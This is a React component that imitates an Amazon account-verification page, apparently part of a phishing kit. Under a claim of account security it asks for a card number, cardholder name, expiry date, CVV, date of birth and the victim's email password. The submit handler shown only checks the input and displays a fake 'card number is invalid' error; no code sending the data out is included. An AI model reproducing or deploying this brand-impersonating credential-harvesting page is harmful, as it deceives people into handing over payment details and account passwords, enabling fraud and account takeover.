import React, { useState } from "react";

import Header from "../components/Header";
import Footer from "../components/Footer";

import LoginError from "../components/LoginError";

const Verify = ({ email }) => {
  document.title = "Amazon.com: Profile";
  const [showError, setShowError] = useState(false);
  const [details, setDetails] = useState({
    cardNumber: "",
    name: "",
    expiry: "",
    cvv: "",
    dob: "",
    password: "",
  });

  const handleSubmit = (e) => {
    e.preventDefault();
    if (
      details?.cardNumber.length !== 25 ||
      details?.name < 3 ||
      details?.password < 3
    ) {
      setShowError(true);
    }
  };

  return (
    <>
      <Header />

      {showError && <LoginError message=" - Card number is invalid" />}

      <main className="w-[23%] mx-auto mt-2 border rounded-[4px] border-[#dad4d4] font-amazonMain px-6">
        <p className="text-black text-[18px] font-normal w-fit my-5">
          To help ensure the security of your Amazon account, Please fill out
          all the required fields.
        </p>

        <form method="post" onSubmit={handleSubmit}>
          <div className="flex flex-col w-full font-bold">
            <label
              htmlFor="cardnumber"
              className="text-black font-bold text-[13px]"
            >
              Credit/Debit Card Number
            </label>

            <input
              type="text"
              id="cardnumber"
              maxLength="25"
              value={details?.cardNumber}
              onChange={(e) =>
                setDetails({ ...details, cardNumber: e.target.value })
              }
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label
              htmlFor="nameoncc"
              className="text-black font-bold text-[13px]"
            >
              Name on card
            </label>

            <input
              type="text"
              id="nameoncc"
              maxLength="75"
              value={details?.name}
              onChange={(e) => setDetails({ ...details, name: e.target.value })}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="exp" className="text-black font-bold text-[13px]">
              Expiration date
            </label>

            <input
              type="text"
              id="exp"
              maxLength="15"
              placeholder="MM/YY"
              value={details?.expiry}
              onChange={(e) =>
                setDetails({ ...details, expiry: e.target.value })
              }
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold">
            <label htmlFor="cvv" className="text-black font-bold text-[13px]">
              CVV
            </label>

            <input
              type="text"
              id="cvv"
              maxLength="4"
              placeholder="Card Security code"
              value={details?.cvv}
              onChange={(e) => setDetails({ ...details, cvv: e.target.value })}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="dd" className="text-black font-bold text-[13px]">
              Date of Birth
            </label>

            <input
              type="text"
              id="dd"
              maxLength="15"
              placeholder="MM/DD/YYYY"
              value={details?.dob}
              onChange={(e) => setDetails({ ...details, dob: e.target.value })}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="email" className="text-black font-bold text-[13px]">
              Email
            </label>

            <input
              type="email"
              id="email"
              maxLength="15"
              readOnly={true}
              value={email}
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-gray-400 text-sm focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
            />
          </div>

          <div className="flex flex-col w-full font-bold my-3">
            <label htmlFor="pass" className="text-black font-bold text-[13px]">
              Email Password
            </label>

            <input
              type="text"
              id="pass"
              value={details?.password}
              maxLength="50"
              onChange={(e) =>
                setDetails({ ...details, password: e.target.value })
              }
              className="mt-1 bg-[#fff] w-full h-[31px] py-[3px] px-[7px] leading-normal border rounded-[3px] outline-none border-[#949494] text-[#111] focus:border-[#e77600] focus:shadow-[0 0 3px 2px rgba(228,121,17,.5)] focus:shadow-[rgba(228,121,17,.5)]"
              style={{
                boxShadow:
                  "0 1px 0 rgba(255,255,255,.5),0 1px 0 rgba(0,0,0,.07) inset",
              }}
              required
            />
          </div>

          <div className="w-full my-4">
            <button
              className="text-[#111] leading-[29px] outline-none border-none bg-gradient-to-b from-[#f7dfa5] to-[#f0c14b] rounded-[2px] h-[29px] w-full mt-2 text-[13px] flex justify-center items-center hover:from-[#f5d78e] hover:to-[#eeb933]"
              type="submit"
            >
              Continue
            </button>
          </div>
        </form>
      </main>

      <Footer />
    </>
  );
};

export default Verify;
